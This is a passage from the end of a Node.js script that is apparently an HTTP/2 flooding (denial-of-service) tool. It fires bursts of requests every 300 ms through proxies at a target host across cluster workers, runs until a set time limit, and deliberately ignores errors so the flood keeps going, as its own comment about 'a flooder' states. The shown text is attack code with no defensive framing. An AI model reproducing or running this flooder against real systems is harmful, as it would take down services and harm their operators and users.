                        // To read body:
                        // let data = '';
                        // request.on('data', (chunk) => data += chunk);
                        // request.on('end', () => { /* console.log('Body:', data) */ });
                    });
                    
                    request.on('error', (err) => {
                        console.error(`[WORKER-${process.pid}] Request Error to ${parsedTarget.host} (via ${proxyAddr}): ${err.message}`.red);
                        // request.destroy(); // Ensure stream is destroyed
                    });

                    request.on('close', () => {
                        // Stream closed, could be normal or due to error/timeout.
                        // console.log(`[WORKER-${process.pid}] Stream closed for ${parsedTarget.host}`.grey);
                        request.destroy(); // Make sure it's fully cleaned up
                    });
                    
                    request.end(); // Send the request
                }
            }, 300); // Interval for sending bursts of requests

            // Clear interval on client close to prevent trying to send on a closed session
            client.on('close', () => clearInterval(IntervalAttack));
        });

        client.on("close", () => {
            // console.log(`[WORKER-${process.pid}] HTTP/2 Client closed for ${parsedTarget.host} (via ${proxyAddr})`.magenta);
            // client.destroy(); // Already closed
            tlsConn.destroy();
            connection.destroy();
        });

        client.on("timeout", () => {
            console.warn(`[WORKER-${process.pid}] HTTP/2 Client Timeout for ${parsedTarget.host} (via ${proxyAddr})`.yellow);
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        });
        
        client.on("error", (error) => {
            console.error(`[WORKER-${process.pid}] HTTP/2 Client Error for ${parsedTarget.host} (via ${proxyAddr}): ${error.message}`.red);
            client.destroy(); // Ensure client is destroyed
            tlsConn.destroy();
            connection.destroy(); // Also destroy underlying connections
        });
    });
}

const StopScript = () => {
    if (cluster.isMaster) {
        console.log('[MASTER] Time limit reached. Shutting down workers...'.brightMagenta);
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
    }
    // console.log(`[${cluster.isMaster ? 'MASTER' : `WORKER-${process.pid}`}] Script stopping.`.magenta);
    process.exit(0); // Use 0 for graceful exit
};

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', (error) => {
    // console.error(`[${cluster.isMaster ? 'MASTER' : `WORKER-${process.pid}`}] Uncaught Exception:`, error.message, error.stack ? error.stack.grey : '');
    // For a flooder, often you just want it to keep trying or ignore minor errors
});
process.on('unhandledRejection', (reason, promise) => {
    // console.warn(`[${cluster.isMaster ? 'MASTER' : `WORKER-${process.pid}`}] Unhandled Rejection at:`, promise, 'reason:', reason ? (reason.message || reason) : 'Unknown reason');
});